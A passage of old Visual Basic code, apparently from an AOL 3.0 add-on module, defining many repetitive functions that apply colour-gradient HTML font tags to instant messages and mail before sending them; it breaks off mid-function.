Function AoL3_ImBoldGreenBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenPurpleGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenRedGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreenYellowGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyBlueGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyGreenGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyPurpleGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyRedGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldGreyYellowGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackPurpleBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackedRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlackYellowBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBluePurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBluePurpleBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueRedBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBlueYellowBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBoldBlackBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackPurpleBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackedRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldBlackYellowBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBluePurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBluePurpleBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueRedBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailBoldBlueYellowBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL3_MailGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenPurpleGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenRedGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
